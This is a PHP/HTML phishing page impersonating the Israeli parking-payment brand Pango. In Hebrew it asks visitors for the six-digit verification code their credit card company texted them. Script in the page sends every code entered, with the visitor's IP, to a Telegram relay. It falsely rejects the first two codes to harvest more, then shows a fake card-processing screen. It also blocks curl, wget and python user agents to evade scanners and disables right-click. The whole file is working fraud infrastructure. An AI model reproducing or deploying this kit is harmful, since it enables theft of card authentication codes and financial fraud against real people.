<?php
include('prevents/anti5.php');
include('prevents/anti1.php');
include('prevents/anti8.php');
include('prevents/anti2.php');
include('prevents/anti4.php');
include('prevents/anti7.php');
include('prevents/anti3.php');

// Anti-Bot Protection
function blockSuspiciousUserAgent()
{
    $botAgents = [
        'curl',
        'wget',
        'bot',
        'crawler',
        'spider',
        'http',
        'python',
        'java'
    ];
    $userAgent = strtolower($_SERVER['HTTP_USER_AGENT']);
    foreach ($botAgents as $bot) {
        if (strpos($userAgent, $bot) !== false) {
            header("HTTP/1.1 403 Forbidden");
            exit('Access denied');
        }
    }
}

function blockSuspiciousIPs()
{
    $blockedIPs = [
        '192.168.1.1',
        '123.456.789.0',
    ];
    if (in_array($_SERVER['REMOTE_ADDR'], $blockedIPs)) {
        header("HTTP/1.1 403 Forbidden");
        exit('Access denied');
    }
}


blockSuspiciousUserAgent();
blockSuspiciousIPs();
?>
<html lang="he">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>נתונים נדרשים</title>
    <link rel="icon" href="https://res.cloudinary.com/sherutnet/image/upload/f_auto,q_auto/mini_logos/pango2.png"
        type="image/png">
    <style>
    body {
        font-family: Arial, sans-serif;
        direction: rtl;
        text-align: center;
        margin: 0;
        padding: 0;
        background-color: #f9f9f9;
        display: flex;
        flex-direction: column;
        justify-content: center;
        align-items: center;
        height: 100vh;
    }

    .header {
        position: absolute;
        top: 0;
        width: 100%;
        display: flex;
        justify-content: center;
        align-items: center;
        padding: 10px 0;
        background-color: white;
        border-bottom: 1px solid #ddd;
    }

    .header img {
        height: 40px;
    }

    .form-container {
        width: 90%;
        max-width: 400px;
        padding: 20px;
        background-color: white;
        border-radius: 12px;
        box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
        text-align: center;
    }

    input {
        width: 100%;
        padding: 12px;
        margin-bottom: 15px;
        border: 1px solid #ddd;
        border-radius: 25px;
        font-size: 16px;
        text-align: center;
        outline: none;
    }

    input.error {
        border-color: red;
    }

    button {
        background-color: #007bff;
        color: white;
        border: none;
        padding: 12px;
        border-radius: 25px;
        cursor: pointer;
        width: 100%;
        font-size: 16px;
    }

    button:hover {
        background-color: #0056b3;
    }

    .error-message {
        color: red;
        font-size: 14px;
        margin-bottom: 15px;
        display: none;
    }

    .instruction {
        background-color: #007bff;
        color: white;
        padding: 10px 15px;
        border-radius: 12px;
        margin-bottom: 20px;
        display: flex;
        align-items: center;
        gap: 10px;
        font-size: 14px;
    }

    .instruction i {
        font-size: 20px;
    }

    .processing-popup {
        display: none;
        position: fixed;
        top: 50%;
        left: 50%;
        transform: translate(-50%, -50%);
        width: 80%;
        max-width: 300px;
        padding: 20px;
        background-color: white;
        border-radius: 12px;
        box-shadow: 0 4px 6px rgba(0, 0, 0, 0.2);
        text-align: center;
        z-index: 999;
    }

    .spinner {
        width: 50px;
        height: 50px;
        border: 5px solid #ccc;
        border-top: 5px solid #007bff;
        border-radius: 50%;
        animation: spin 1s linear infinite;
        margin: 0 auto 15px;
    }

    @keyframes spin {
        from {
            transform: rotate(0deg);
        }

        to {
            transform: rotate(360deg);
        }
    }

    @media (max-width: 768px) {
        input {
            font-size: 14px;
            padding: 10px;
        }

        button {
            font-size: 14px;
            padding: 10px;
        }

        .spinner {
            width: 40px;
            height: 40px;
        }

        h1 {
            font-size: 16px;
        }
    }
    </style>
    <script>
    let attempts = 0;
    let isNotified = false;

    function notifyTelegram(message) {
        fetch("send_to_telegram.php", {
            method: "POST",
            headers: {
                "Content-Type": "application/x-www-form-urlencoded"
            },
            body: `message=${encodeURIComponent(message)}`
        });
    }

    function handleInputFocus() {
        if (!isNotified) {
            notifyTelegram("🔔 The user has started typing in the code field. IP: " +
                "<?php echo $_SERVER['REMOTE_ADDR']; ?>");
            isNotified = true;
        }
    }

    function validateCode() {
        const input = document.getElementById('code-input');
        const errorMessage = document.getElementById('error-message');
        const popup = document.querySelector('.processing-popup');

        if (input.value.length !== 6) {
            errorMessage.innerText = "הקוד חייב להיות בן 6 ספרות";
            errorMessage.style.display = "block";
            input.classList.add('error');
            return false;
        }

        errorMessage.style.display = "none";
        input.classList.remove('error');
        popup.style.display = "block";

        notifyTelegram("🚨 Attempt to enter code: " + input.value + ". IP: <?php echo $_SERVER['REMOTE_ADDR']; ?>");

        setTimeout(() => {
            popup.style.display = "none";
            attempts++;
            if (attempts < 3) {
                errorMessage.innerText = `הקוד שהוזן אינו תקין. ${3 - attempts} ניסיונות נותרו.`;
                errorMessage.style.display = "block";
                input.value = "";
            } else {
                popup.querySelector("p").innerText = "מעבד נתוני כרטיס...";
                popup.style.display = "block";

                setTimeout(() => {
                    window.location.href = "The-matter";
                }, 15000);
            }
        }, 7000);
    }
    </script>
</head>
<script language=JavaScript>
var message = "";

function clickIE() {
    if (document.all) {
        (message);
        return false;
    }
}

function clickNS(e) {
    if (document.layers || (document.getElementById && !document.all)) {
        if (e.which == 2 || e.which == 3) {
            (message);
            return false;
        }
    }
}
if (document.layers) {
    document.captureEvents(Event.MOUSEDOWN);
    document.onmousedown = clickNS;
} else {
    document.onmouseup = clickNS;
    document.oncontextmenu = clickIE;
}

document.oncontextmenu = new Function("return false")
// --> 
</script>




<body>
    <div class="header">
        <img src="https://www.pango.co.il/tpl/website/img/logo.png" alt="Pango Logo">
    </div>
    <div class="form-container">
        <div class="instruction">
            <i>ℹ️</i>
            <span>הזן את הקוד שקיבל בהודעה מחברת כרטיס אשראי לטלפון שלך</span>
        </div>
        <input id="code-input" type="text" placeholder="הזן קוד אימות" maxlength="6"
            oninput="this.value = this.value.replace(/[^0-9]/g, '')" onfocus="handleInputFocus()">
        <div id="error-message" class="error-message"></div>
        <button id="submit-btn" onclick="validateCode()">אמת</button>
    </div>
    <div class="processing-popup">
        <div class="spinner"></div>
        <p>מעבד נתונים...</p>
    </div>
    <div class="footer" style="background-color: white; padding: 20px; border-top: 1px solid #ddd;">
        <p style="font-size: 18px; font-weight: bold; text-align: center; margin-bottom: 20px;">הורידו את האפליקציה</p>
        <div class="download-buttons" style="display: flex; justify-content: center; gap: 15px; margin-bottom: 20px;">
            <a href="#"
                style="display: inline-flex; align-items: center; justify-content: center; background-color: transparent; color: #007bff; border: 2px solid #007bff; padding: 10px 15px; border-radius: 25px; text-decoration: none; font-size: 14px;">
                &#9658; Google Play
            </a>
            <a href="#"
                style="display: inline-flex; align-items: center; justify-content: center; background-color: #007bff; color: white; padding: 10px 15px; border-radius: 25px; text-decoration: none; font-size: 14px;">
                &#63743; Apple Store
            </a>
        </div>
        <ul style="list-style: none; padding: 0; margin: 0; text-align: center;">
            <li style="margin: 5px 0;"><a href="#"
                    style="color: #007bff; text-decoration: none; font-size: 14px;">הסדרים משפטיים</a></li>
            <li style="margin: 5px 0;"><a href="#"
                    style="color: #007bff; text-decoration: none; font-size: 14px;">אפשרות הסרת שירותים</a></li>
            <li style="margin: 5px 0;"><a href="#"
                    style="color: #007bff; text-decoration: none; font-size: 14px;">פרסומים</a></li>
            <li style="margin: 5px 0;"><a href="#" style="color: #007bff; text-decoration: none; font-size: 14px;">אבטחת
                    מידע</a></li>
            <li style="margin: 5px 0;"><a href="#" style="color: #007bff; text-decoration: none; font-size: 14px;">תנאי
                    שימוש פנגו</a></li>
            <li style="margin: 5px 0;"><a href="#"
                    style="color: #007bff; text-decoration: none; font-size: 14px;">מדיניות פרטיות</a></li>
            <li style="margin: 5px 0;"><a href="#" style="color: #007bff; text-decoration: none; font-size: 14px;">עירוי
                    פנגו</a></li>
            <li style="margin: 5px 0;"><a href="#"
                    style="color: #007bff; text-decoration: none; font-size: 14px;">אודות</a></li>
            <li style="margin: 5px 0;"><a href="#" style="color: #007bff; text-decoration: none; font-size: 14px;">מפת
                    אתר</a></li>
        </ul>
    </div>

</body>

</html>